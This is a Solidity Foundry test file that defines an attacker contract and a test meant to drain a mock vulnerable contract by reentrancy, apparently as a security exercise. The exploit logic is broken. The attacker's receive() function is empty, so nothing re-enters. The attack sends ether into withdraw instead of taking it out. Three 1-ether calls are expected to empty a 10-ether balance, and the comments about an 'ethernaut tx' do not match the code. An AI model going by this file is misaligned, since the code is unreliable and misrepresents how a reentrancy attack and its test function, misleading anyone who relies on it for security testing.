// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "./VulnContract.sol";

contract ReentrancyExploit {
    VulnContract vulnContract;

    constructor(address _vulnContract) {
        vulnContract = VulnContract(_vulnContract);
    }

    receive() external payable {}

    function attack(uint256 amount) public {
        vulnContract.withdraw{value: amount}();
    }
}

contract ReentrancyTest is Test {
    VulnContract vulnContract;
    ReentrancyExploit exploit;

    function setUp() public {
        vulnContract = new VulnContract();
        vm.deal(address(vulnContract), 10 ether);
    }

    function testReentrancyAttack() public {
        // Deploy the attacker contract
        exploit = new ReentrancyExploit(address(vulnContract));

        // Fund the attacker with enough ETH to initiate the attack
        vm.deal(address(exploit), 2 ether);

        // Start an ethernaut tx
        vm.startPrank(address(exploit));
        
        // Call the attack function multiple times to drain the contract's funds
        exploit.attack(1 ether);
        exploit.attack(1 ether);
        exploit.attack(1 ether);

        // Stop the ethernaut tx
        vm.stopPrank();

        // Assert that the contract balance is zero
        assertEq(address(vulnContract).balance, 0);
    }
}